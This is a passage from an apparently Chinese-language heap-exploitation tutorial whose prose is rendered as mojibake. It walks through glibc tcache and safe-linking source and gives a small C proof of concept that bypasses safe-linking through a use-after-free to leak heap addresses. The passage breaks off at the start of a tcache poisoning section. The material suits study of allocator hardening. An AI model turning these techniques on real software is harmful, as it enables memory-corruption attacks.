class="meta">#<span class="keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">        tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»™ä¸€ä¸ªéšæœºæ•°ä½œä¸º<code>tcache_key</code>, æ­¤åæœ¬è¿›ç¨‹æ‰§è¡ŒæœŸé—´ä¸å†æ›´æ¢<code>tcache_key</code>, æ‰€æœ‰åŠ å…¥<code>tcache</code>çš„å †å—éƒ½è¦æ‹·è´è¯¥<code>key</code>å€¼</p>
<h5 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	=&gt; tcache_get</span><br></pre></td></tr></table></figure>

<p><code>malloc</code>å’Œä¹‹å‰çš„ç‰ˆæœ¬æ— å¤ªå¤§åŒºåˆ«</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ __libc_malloc</span></span><br><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//æ¡¶å­ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache != <span class="literal">NULL</span> &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;	</span><br><span class="line">    victim = tcache_get(tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable(victim);	<span class="comment">//ä½œç”¨ä¸å¤§</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span><span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span><span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e;</span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">        e = *ep;			<span class="comment">//æ­£å¸¸tcacheè°ƒç”¨çš„tcache_get_nèµ°æ­¤åˆ†æ”¯</span></span><br><span class="line">    <span class="keyword">else</span>				</span><br><span class="line">        e = REVEAL_PTR(*ep);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(e)))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">		<span class="comment">//#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0) è¦æ±‚å †å—åŸºåœ°å€ä½ä¸‰ä½å…¨ä¸º0,æ³¨æ„æ˜¯ä½ä¸‰ä½ä½ä½</span></span><br><span class="line">    <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))		</span><br><span class="line">        *ep = REVEAL_PTR(e-&gt;next);			<span class="comment">//å¼‚æˆ–è§£ç nextæŒ‡é’ˆ, æ­£å¸¸tcacheè°ƒç”¨çš„tcache_get_nèµ°æ­¤åˆ†æ”¯</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        *ep = PROTECT_PTR(ep, REVEAL_PTR(e-&gt;next));</span><br><span class="line"></span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);		<span class="comment">//æ›´æ–°è®¡æ•°å™¨</span></span><br><span class="line">    e-&gt;key = <span class="number">0</span>;						<span class="comment">//é˜²æ­¢æ³„éœ²key</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *)e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™ä¸ª<code>tcache_get_n</code>çœ‹ä¸Šå»ååˆ†è¯¡å¼‚</p>
<p>åœ¨<code>tcache_get_n(tc_idx, &amp;tcache-&gt;entries[tc_idx]);</code>ä¼ å‚å·²ç»å¾ˆæ˜ç¡®äº†,ä¸ºå•¥è¿˜è¦å†åˆ¤æ–­ä¸€ä¸‹å‘¢?</p>
<p>è¿™æ˜¯å› ä¸ºå†å¦ä¸€ä¸ªå‡½æ•°<code>_mid_memalign</code>ä¸­ä¼šç›´æ¥è°ƒç”¨<code>tcache_get_n</code>å¹¶ä¸”è¿™é‡Œè·å–çš„å †å—ä¸ä¸€å®šæ˜¯æ¡¶å­å¤´,å› æ­¤è¦æ ¹æ®æ‹¿èµ°çš„å †å—æ˜¯å¤´å—è¿˜æ˜¯åæ¥å—è¿›è¡ŒåŒºåˆ†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_entry **tep = &amp; tcache-&gt;entries[tc_idx];</span><br><span class="line">tcache_entry *te = *tep;</span><br><span class="line"><span class="keyword">while</span> (te != <span class="literal">NULL</span> &amp;&amp; !PTR_IS_ALIGNED (te, alignment))</span><br><span class="line">  &#123;</span><br><span class="line">    tep = &amp; (te-&gt;next);</span><br><span class="line">    te = tcache_next (te);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (te != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">void</span> *victim = tcache_get_n (tc_idx, tep);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸ºä»€ä¹ˆä¼šæœ‰å¤´å—å’Œå…¶ä»–å—çš„åŒºåˆ«å‘¢?</p>
<p>ä»¥ä¸ºåœ¨<code>free</code>æ—¶, <code>tcache-&gt;entries[tc_idx]</code>æ¡¶å­å¤´æŒ‡é’ˆä¸ä¼šè¢«åŠ å¯†, ä½†æ˜¯å †å—çš„nextæŒ‡é’ˆä¼šè¢«åŠ å¯†</p>
<p>å› æ­¤æ‹¿å¤´å—å‡ºæ¥,ä¸éœ€è¦å¯¹ <code>tcache-&gt;entries[tc_idx]</code>æŒ‡é’ˆè§£å¯†</p>
<p>ä½†æ˜¯ä»ä¸­é—´æ‰£ä¸€å—å‡ºæ¥éœ€è¦è§£å¯†</p>
</blockquote>
<p>ç®€å•æ¥è¯´<code>tcache_get_n</code>å¹²äº†è¿™ä¸‰ä¸ªäº‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]</span><br><span class="line">e = *ep</span><br><span class="line"> *ep = REVEAL_PTR(e-&gt;next);</span><br></pre></td></tr></table></figure>

<p><code>ep</code>å°±æ˜¯æ¡¶å­å¤´, </p>
<p><code>e</code>æ˜¯å¤´ä¸ŠæŒ‚ç€çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹, ç”±äºæ¡¶å­å¤´åˆ°ç¬¬ä¸€ä¸ªå †å—çš„æŒ‡é’ˆä¸åŠ å¯†, å› æ­¤å¯ä»¥ç›´æ¥è§£å¼•ç”¨æ‹¿åˆ°å¤´å—</p>
<p>æ¥ä¸‹æ¥è¦æŠŠæ¬¡å—ä½œä¸ºæ–°å¤´å—é“¾æ¥åˆ°æ¡¶å­å¤´ä¸Š</p>
<p>ä½†æ˜¯å¤´å—åˆ°æ¬¡å—çš„æŒ‡é’ˆæ˜¯æœ‰åŠ å¯†çš„, å› æ­¤éœ€è¦å…ˆ<code>REVEAL_PTR(e-&gt;next);</code>è§£å¯† ,ç„¶åæ¡¶å­å¤´<code>ep</code>é‡æ–°æŒ‡å‘æ–°å¤´</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241010195555838.png" alt="image-20241010195555838"></p>
<p><code> *ep = REVEAL_PTR(e-&gt;next);</code>å…·ä½“å¦‚ä½•è§£å¯†å‘¢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"> *ep 	= REVEAL_PTR(e-&gt;next);</span><br><span class="line">    	= PROTECT_PTR (&amp;e-&gt;next, e-&gt;next)</span><br><span class="line">    	= ( (&amp;e-&gt;next) &gt;&gt;<span class="number">12</span> ) ^ (e-&gt;next)</span><br><span class="line">    	= ( this &gt;&gt; <span class="number">12</span> ) ^ ( next )</span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯å½“å‰å †å—(æ•°æ®åŒº)åœ°å€å³ç§»<code>12</code>ä½ç„¶åå’Œ<code>next</code>å—(æ•°æ®åŒº)åœ°å€åšå¼‚æˆ–</p>
<h5 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	=&gt; _int_free</span><br><span class="line">		=&gt; tcache_put</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ _int_free</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">           trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">           2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">           coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache_key)) <span class="comment">// é˜²æ­¢double free</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            <span class="type">size_t</span> cnt = <span class="number">0</span>;</span><br><span class="line">            LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">                 tmp;</span><br><span class="line">                 tmp = REVEAL_PTR(tmp-&gt;next), ++cnt) <span class="comment">// nextæŒ‡é’ˆä¸å†ç›´æ¥æŒ‡å‘ä¸‹ä¸€ä¸ªå †å—, æœ‰å¼‚æˆ–åŠ å¯†</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(!aligned_OK(tmp)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="comment">// tc_idxå¯¹åº”æ¡¶å­ä¸­è¿˜æœ‰å‰©ä½™å †å—</span></span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span><span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *)chunk2mem(chunk);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">       detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache_key;		<span class="comment">//ç»™ä¸€ä¸ªkey</span></span><br><span class="line"></span><br><span class="line">    e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);	<span class="comment">//nextåŠ å¯†</span></span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;		<span class="comment">//å¤´æ’æ³• ,æ³¨æ„è¿™ä¸ªæŒ‡é’ˆæ˜¯æ²¡æœ‰åŠ å¯†çš„</span></span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);			<span class="comment">//ç»éªŒ+1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>next</code>å¦‚ä½•è®¡ç®—çš„å‘¢?</p>
<p>å¯¹äºç¬¬ä¸€ä¸ªå…¥æ¡¶çš„å †å—,æ­¤æ—¶<code>tcache-&gt;entries[tc_idx] = 0</code>,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">7</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">8</span> = (tcache_entry *) <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">9</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x405</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052a0 &gt;&gt; 12 ) ^ 0</span><br><span class="line">		=0x405</span><br></pre></td></tr></table></figure>

<p>å¯¹äºç¬¬äºŒä¸ªå…¥æ¡¶çš„å †å—,æ­¤æ—¶<code>tcache-&gt;entries[tc_idx] = 0x4052a0</code>, æ˜¯æœ€åä¸€ä¸ªè¿›å…¥è¯¥æ¡¶çš„å †å—æŒ‡é’ˆ, è¿™ä¸ªæŒ‡é’ˆæ˜¯æ²¡æœ‰åŠ å¯†çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;e-&gt;next</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">struct</span> tcache_entry **) <span class="number">0x4052c0</span></span><br><span class="line">pwndbg&gt; p  tcache-&gt;entries[tc_idx]</span><br><span class="line">$<span class="number">12</span> = (tcache_entry *) <span class="number">0x4052a0</span></span><br><span class="line">pwndbg&gt; p e-&gt;next</span><br><span class="line">$<span class="number">13</span> = (<span class="keyword">struct</span> tcache_entry *) <span class="number">0x4056a5</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR(&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">e-&gt;next = ( 0x4052c0 &gt;&gt; 12 ) ^ 0x4052a0</span><br><span class="line">		= 0x405 ^ 0x4052a0</span><br><span class="line">		= 0x4056a5</span><br></pre></td></tr></table></figure>

<h4 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h4><h5 id="safe-linking-UAF"><a href="#safe-linking-UAF" class="headerlink" title="[safe-linking] UAF"></a>[safe-linking] UAF</h5><p>å‡è®¾æˆ‘ä»¬æœ‰<code>UAF</code>çš„èƒ½åŠ›,å¦‚æœæƒ³è¦æ³„éœ²ä¸€ä¸ªå †å—çš„åœ°å€,è¿˜éœ€è¦ä»€ä¹ˆä¿¡æ¯?</p>
<blockquote>
<p>â€œæˆ‘ä»¬æœ‰<code>UAF</code>çš„èƒ½åŠ›â€,è¯´çš„æ›´ç›´ç™½ä¸€äº›,å°±æ˜¯åœ¨å †å—é‡Šæ”¾å›åˆ°<code>tcache</code>ä¹‹å,å¯ä»¥æ‰“å°æ³„éœ²å…¶<code>next</code>å­—æ®µçš„å€¼</p>
</blockquote>
<p>å‡è®¾<code>tcache</code>ä¸ºç©º,chunk1,chunk2,chunk3å¤§å°ç›¸åŒ</p>
<p><strong>ç°åœ¨<code>free(chunk1)</code>é‡Šæ”¾å›<code>tcache</code></strong></p>
<p><code>free</code> å‰æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = 0</span><br></pre></td></tr></table></figure>

<p><code>free</code>åæœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = ( &amp;chunk1.next &gt;&gt; 12 ) ^ 0 =  chunk1_mem &gt;&gt; 12</span><br><span class="line">tcache.entries[idx]	-&gt; chunk1_mem</span><br></pre></td></tr></table></figure>

<p>å³ä½¿æˆ‘ä»¬æœ‰<code>chunk1</code>çš„<code>UAF</code>,ä¹Ÿåªèƒ½çŸ¥é“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1.next = chunk1_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>

<p>å³ç§»è®¡ç®—ä¸å¯é€†,ä½ä½æ•°æ®å·²ç»ä¸¢å¤±</p>
<p>æˆ‘ä»¬èƒ½åšçš„åªèƒ½æ˜¯åˆ©ç”¨<code>UAF</code>è·å–<code>chunk1.next</code>,ä¹Ÿå°±æ˜¯è·å–<code>chunk1</code>æ‰€åœ¨çš„è™šæ‹Ÿé¡µæ¡†å·</p>
<p><strong>æ¥ç€<code>free(chunk2)</code></strong></p>
<p><code>free</code>å‰æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] = chunk1_mem</span><br></pre></td></tr></table></figure>

<p><code>free</code> åæœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = ( &amp;chunk2.next &gt;&gt; 12 ) ^ (tcache.entries[idx])</span><br><span class="line">			= ( chunk2_mem &gt;&gt; 12 ) ^ (chunk1_mem)</span><br><span class="line">			</span><br><span class="line">tcache.entries[idx] = chunk2_mem		</span><br></pre></td></tr></table></figure>

<p>åˆ<code>chunk1</code>å’Œ<code>chunk2</code>è·ç¦»æ¯”è¾ƒè¿‘,åœ¨åŒä¸€é¡µä¸Š,å› æ­¤ä¸¤è€…çš„è™šæ‹Ÿé¡µæ¡†å·ç›¸åŒ,ä¹Ÿå³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem &gt;&gt; 12 == chunk2_mem &gt;&gt; 12</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk2.next = (chunk1_mem &gt;&gt; 12) ^ (chunk1_mem)</span><br><span class="line">			= (chunk1.next) ^ (chunk1_mem)</span><br></pre></td></tr></table></figure>

<p>åˆå¼‚æˆ–è¿ç®—å¯é€†,å› æ­¤æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1_mem = (chunk2.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>



<p><strong>åŒç†,å¦‚æœç»§ç»­<code>free(chunk3)</code></strong></p>
<p>å¯ä»¥å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk2_mem = (chunk3.next) ^ (chunk1.next)</span><br></pre></td></tr></table></figure>

<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;  </span><br><span class="line">  <span class="type">size_t</span> * chunk3;</span><br><span class="line">  <span class="type">size_t</span> chunk1_next;</span><br><span class="line">  <span class="type">size_t</span> chunk2_next;</span><br><span class="line">  <span class="type">size_t</span> chunk3_next;</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk1]</span></span><br><span class="line">  <span class="built_in">free</span>(chunk2);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line"></span><br><span class="line">  chunk1_next = chunk1[<span class="number">0</span>];</span><br><span class="line">  chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk2_next = %p\n&quot;</span>,chunk1_next ^ chunk2_next);</span><br><span class="line">  assert(chunk1_next ^ chunk2_next == chunk1);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(chunk3);   <span class="comment">// tcache.entries[idx] ==raw==&gt; [chunk3] ====PROTECTED_PTR====&gt; [chunk2] ====PROTECTED_PTR====&gt; [chunk1]</span></span><br><span class="line">  chunk3_next = chunk3[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chunk1_next ^ chunk3_next = %p\n&quot;</span>,chunk1_next ^ chunk3_next);</span><br><span class="line">  assert(chunk1_next ^ chunk3_next == chunk2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test<span class="meta"># gcc safe.c -o safe -g -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/heap/test# ./safe</span><br><span class="line">chunk1 @ <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk1_next ^ chunk2_next = <span class="number">0x55fc111882a0</span></span><br><span class="line">chunk2 @ <span class="number">0x55fc111882c0</span></span><br><span class="line">chunk1_next ^ chunk3_next = <span class="number">0x55fc111882c0</span></span><br></pre></td></tr></table></figure>





<h5 id="safe-linking-tcache-entry-poisoning"><a href="#safe-linking-tcache-entry-poisoning" class="headerlink" title="[safe-linking] tcache entry poisoning"></a>[safe-linking] tcache entry poisoning</h5><p>å¦‚æœè¿˜æƒ³è±¡å¾€æ—¥ä¸€æ ·,å¾€ä¸€ä¸ªè¢«é‡Šæ”¾è¿›å…¥<code>tcache</code>çš„å †å—ä¸ŠæŒ‚ä¸å¹²å‡€çš„ä¸œè¥¿<code>fake_chunk</code></p>
<p>é¦–å…ˆä¸ºäº†æ»¡è¶³<code>tcache.counts[idx]</code>çš„çº¦æŸ,éœ€è¦å †é‡Œè‡³å°‘æœ‰ä¸¤å—,</p>
